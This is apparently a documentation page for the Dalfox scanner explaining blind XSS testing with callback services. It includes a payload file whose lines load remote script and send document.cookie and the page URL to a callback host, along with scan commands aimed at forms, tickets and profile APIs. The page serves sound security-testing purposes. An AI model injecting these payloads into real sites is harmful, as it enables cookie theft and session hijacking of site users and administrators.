+++
title = "Blind XSS Testing"
description = "Learn how to test for blind XSS vulnerabilities using Dalfox"
weight = 3
sort_by = "weight"

[extra]
+++

Blind XSS executes in contexts you can't directly observe (admin panels, logs, emails). Use callback URLs for out-of-band verification.

## Callback Services

- **Burp Collaborator** (Burp Suite Pro)
- **Interactsh** ([app.interactsh.com](https://app.interactsh.com))
- **XSS Hunter**
- Custom server

## Basic Usage

```bash
dalfox scan https://example.com -b https://your-callback-url
```

Dalfox injects blind payloads into all parameters. Monitor your callback service for execution signals.

## Custom Payloads

Use `{}` as callback URL placeholder:

**blind-payloads.txt:**
```html
<script src="{}/xss.js"></script>
<img src=x onerror="fetch('{}?c='+document.cookie)">
<svg onload="fetch('{}?loc='+location.href)">
```

```bash
dalfox scan https://example.com -b https://callback.com --custom-blind-xss-payload blind-payloads.txt
```

## Examples

**Contact Form**:
```bash
dalfox scan https://example.com/contact -X POST -d "name=test&email=test@example.com&message=test" -b https://callback.burpcollaborator.net -p name -p message
```

**Support Ticket**:
```bash
dalfox scan https://support.example.com/submit -X POST -H "Authorization: Bearer token" -d "subject=Help&description=Issue" -b https://callback.interact.sh
```

**Profile Update**:
```bash
dalfox scan https://example.com/api/profile -X PUT -H "Content-Type: application/json" -d '{"name":"test","bio":"bio"}' -b https://callback.com -p name -p bio
```

**Multiple URLs**:
```bash
dalfox scan -i file urls.txt -b https://callback.com --custom-blind-xss-payload blind.txt -W params.txt -f json -o results.json
```

## Common Targets

- Support/help desk tickets
- User profile fields (name, bio, location)
- Contact/feedback forms
- Comments and reviews
- Log data (User-Agent, headers)

## Best Practices

- Use HTTPS callbacks (CSP/mixed content policies)
- Be patient (execution may be delayed)
- Use unique identifiers in callback URLs
- Test with permission only
- Document findings thoroughly

## See Also

- [Basic XSS Scanning](/usage_guides/basic_xss_scanning) - Standard XSS testing
- [Stored XSS Testing](/usage_guides/stored_xss_testing) - Testing stored XSS
- [Scan Command](/sub-commands/scan) - Complete scan reference
- [Custom Payloads](/usage_guides/custom_payloads) - Creating custom payloads
